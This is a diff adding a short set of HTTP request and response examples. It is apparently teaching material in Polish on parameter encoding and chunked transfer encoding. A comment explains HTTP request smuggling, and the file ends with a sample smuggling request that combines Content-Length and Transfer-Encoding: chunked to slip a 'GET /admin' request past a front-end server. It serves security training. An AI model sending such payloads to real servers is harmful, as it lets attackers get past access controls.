@@ -1,0 +1,63 @@
+---request
+GET /start/request.php?parametr1=wartosc1&parametr2=wartosc2&parametr3 ⤦
+=wartosc3 HTTP/1.1
+Host: training.securitum.com
+
+
+---response
+HTTP/1.1 200 OK
+Date: Fri, 25 Mar 2022 21:30:06 GMT
+Server: Apache
+Content-Length: 39
+Content-Type: text/html; charset=UTF-8
+
+parametr1: wartosc1
+parametr2: wartosc2
+---request
+GET /start/request%2ephp?parametr1=a%2bb&p%61rametr2=a%26+b%20c HTTP/1.1
+
+
+---response
+HTTP/1.1 200 OK
+Date: Tue, 29 Jan 2019 19:47:52 GMT
+Server: Apache
+Vary: Accept-Encoding
+Content-Length: 32
+Content-Type: text/html
+parametr1: a+b
+parametr2: a& b c
+77
+--request
+POST /start/request.php HTTP/1.1
+Host: training.securitum.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 54
+
+2b
+parametr1=wartosc1&parametr2=wartoscwartosc
+0
+
+---response
+HTTP/1.1 200 OK
+Date: Fri, 25 Mar 2022 21:35:20 GMT
+Server: Apache
+Content-Length: 45
+Content-Type: text/html; charset=UTF-8
+
+parametr1: wartosc1
+parametr2: wartoscwartosc
+
+//Do czego ten mechanizm może zostać wykorzystany? Do nieoczekiwanych wstrzyknięć żądań HTTP, możliwych w przypadkach, kiedy w ich przetwarzaniu bierze udział wiele serwerów HTTP (np. serwer frontowy sprawdzający m.in. uprawnienia użytkownika do konkretnych URL-i oraz serwer backendowy realizujący logikę biznesową). Atak polega najczęściej na jednoczesnym użyciu w żądaniu dwóch nagłówków: Content-Length oraz Transfer-Encoding z wartością chunked. Dodatkowo, aby atak się powiódł, wymagane jest wysłanie dwóch lub więcej żądań – pierwsze „zatruwa” komunikację, kolejne realizują cel atakującego.
+---request example
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: x
+
